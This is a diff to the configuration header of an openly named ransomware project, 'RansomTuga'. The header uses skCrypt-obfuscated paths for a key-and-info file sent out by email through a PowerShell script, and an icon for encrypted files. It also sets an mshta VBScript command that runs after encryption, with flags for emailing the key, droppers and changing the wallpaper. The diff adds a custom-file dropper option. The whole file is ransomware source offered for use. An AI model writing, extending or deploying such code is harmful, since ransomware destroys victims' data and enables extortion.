@@ -32,6 +32,7 @@
 #define INFOFILE		(string)skCrypt("C:\\Windows\\System32\\info.txt")			// filepath of the file sended via email with all infos and key
 #define EMAILSENDER		(string)skCrypt("C:\\Windows\\System32\\sender.ps1")		// filepath of the email sender
 #define FILESICON		(string)skCrypt("C:\\Windows\\System32\\tugaIcon.ico")		// filepath of the default icon of encrypted files
+#define CUSTOMFILE_LOC	(string)skCrypt("C:\\customfile.extension")					// filepath of the custom file dropped
 
 /* misc settings */
 #define CUSTOM_COMMAND		(string)skCrypt("mshta vbscript:Execute(\"msgbox \"\"You're fucked up!\",0,\"\"RansomTuga docet\"\":close\")")		// custom command that run after encryptions
@@ -48,6 +49,7 @@
 #define ENABLE_WHITELIST	true	// enable or disable whitelist for file extension
 #define DROP_README			false	// enable or disable README dropper
 #define DROP_DECRYPTOR		false	// enable or disable Decryptor dropper
+#define DROP_CUSTOM_FILE	false	// enable or disable custom file dropper (custom file location at the beggining of main.cpp)
 #define CHANGE_WALLPAPER	false	// enable or disable changer of wallpaper
 #define SEND_EMAIL			true	// enable or disable email sender
 #define DEBUG_SEND_EMAIL	false	// enable or disable email sender in debug mode
